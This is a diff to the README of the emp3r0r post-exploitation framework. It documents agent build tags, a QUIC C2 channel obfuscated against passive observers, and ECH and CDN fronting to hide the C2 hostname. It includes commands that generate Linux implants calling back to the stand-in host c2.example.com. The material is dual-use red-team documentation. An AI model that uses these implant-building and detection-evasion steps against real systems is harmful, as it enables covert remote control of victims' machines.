@@ -22,8 +22,9 @@ git clone --depth=1 https://github.com/jm33-m0/emp3r0r.git && cd emp3r0r
 
 The installer builds everything in a throwaway container and prepares the
 operator kit. Useful flags: `--lightweight` (Linux/Windows amd64 only, fastest),
-`--targets OS/ARCH,...`, `--agent-slim` / `--agent-tags` (trim agent features to
-shrink the implant and reduce fingerprinting), `--debug`, `--skip-build`.
+`--targets OS/ARCH,...`, `--agent-slim` / `--agent-tags` (choose which optional
+agent features to compile in, to shrink the implant and reduce fingerprinting),
+`--debug`, `--skip-build`.
 
 Launch the server:
 
@@ -225,6 +226,70 @@ nodes) routes through a peer that shares a usable transport instead of assuming
 everyone runs the local default. `smb` is only accepted for Windows payloads;
 kcp/mtls work everywhere.
 
+#### Choosing the C2 transport and agent features
+
+Optional agent subsystems are **opt-in** with `with_*` Go build tags. The default
+full build enables every feature, so a normal release agent already has all of
+them. To build a leaner agent, select exactly what it needs with `--agent-tags`;
+`install.py --list-agent-tags` prints the reference. `--agent-slim` selects the
+smallest agent: plain HTTP polling with `crypto/tls` and no optional subsystems.
+
+| Scenario | Build tags |
+| --- | --- |
+| Smallest agent, least strings | `--agent-slim` |
+| Randomized TLS fingerprint (uTLS) | `with_utls` |
+| HTTP/2 streaming C2 | `with_h2conn` |
+| QUIC C2 with the per-build static key | `with_quic` |
+| ECH behind an ECH-capable CDN | `with_doh with_ech with_utls` |
+| P2P mesh (relay + gossip) | `with_mesh with_kcp` |
+| Everything (default full build) | `with_mesh with_kcp with_h2conn with_quic with_utls with_doh with_ech with_cdnproxy with_netlink with_uring` |
+
+CDN fronting is not a build-time choice: every CDN fronts plain HTTP(S), so set
+`--cc` to the CDN hostname and use the default `http_poll` transport (`with_h2conn`
+for HTTP/2). `with_cdnproxy` only compiles the older WebSocket `--cdn` tunnel and
+is unnecessary when the CDN terminates HTTPS directly.
+
+Examples:
+
+```bash
+# Minimal agent with only the QUIC channel and uTLS fingerprinting
+install.py --agent-tags 'with_quic with_utls'
+
+# A full mesh node that also speaks QUIC
+install.py --agent-tags 'with_mesh with_kcp with_quic with_utls'
+```
+
+Each C2 transport is selected per agent with `generate --c2-channel-mode`:
+`http_poll` (plain HTTP polling, always available), `h2conn` (HTTP/2 duplex, needs
+`with_h2conn`), or `quic` (needs `with_quic`). The runtime HTTP transport uses
+`crypto/tls` unless the agent was built with `with_utls`. C2 server binaries are
+always built with every tag, so a single server can serve every agent flavour.
+
+#### QUIC transport
+
+The QUIC channel is a byte stream over UDP whose datagrams are obfuscated with a
+static key derived from the build's `MagicString`, so a passive observer cannot
+read the QUIC Initial/ClientHello. Because the static key is custom, agent and
+C2 must share the same build batch. To instead speak stock QUIC (for example to
+blend with, or reach, HTTP/3 endpoints), generate the agent with
+`--quic-standard-key`; this records `quic_standard_key: true` in
+`emp3r0r.json`, and the QUIC listener must be restarted to pick it up. QUIC is
+UDP-only: it does not use `--proxy`, and it does not ride the P2P mesh.
+
+```bash
+# Agent that speaks the custom-key QUIC C2 transport
+emp3r0r generate --type linux_executable --arch amd64 --cc c2.example.com \
+  --c2-channel-mode quic
+
+# Same, but stock QUIC (HTTP/3-interoperable)
+emp3r0r generate --type linux_executable --arch amd64 --cc c2.example.com \
+  --c2-channel-mode quic --quic-standard-key
+```
+
+The C2 enables the QUIC listener by setting `"c2_channel_mode": "quic"` in
+`emp3r0r.json` (the same field that selects `http_poll`/`h2conn`) before
+starting the server.
+
 #### Hiding the C2 name behind a CDN (ECH)
 
 When the C2's TLS is terminated by an ECH-capable CDN edge (for example
@@ -240,8 +305,13 @@ generate --type linux_executable --arch amd64 --cc c2.example.com \
 The CDN edge holds the ECH key, and a network observer then sees only the ECH
 public name rather than `c2.example.com`. ECH is mandatory once configured: an
 endpoint that does not support it rejects the handshake, so omit `--ech` unless
-the C2 really is behind an ECH-capable CDN. The CDN2Proxy (`--cdn`) WebSocket
-path tunnels the C2 TLS itself, so ECH does not apply there.
+the C2 really is behind an ECH-capable CDN.
+
+This is the normal CDN path: the CDN terminates HTTPS and forwards HTTP to the
+C2, so no special transport is needed. The older `--cdn` WebSocket tunnel
+(compiled in with `with_cdnproxy`) is only for CDNs where you cannot terminate
+TLS yourself; it tunnels the C2 TLS, so ECH does not apply there and you do not
+need it for ordinary CDN fronting.
 
 ## Container capabilities
 
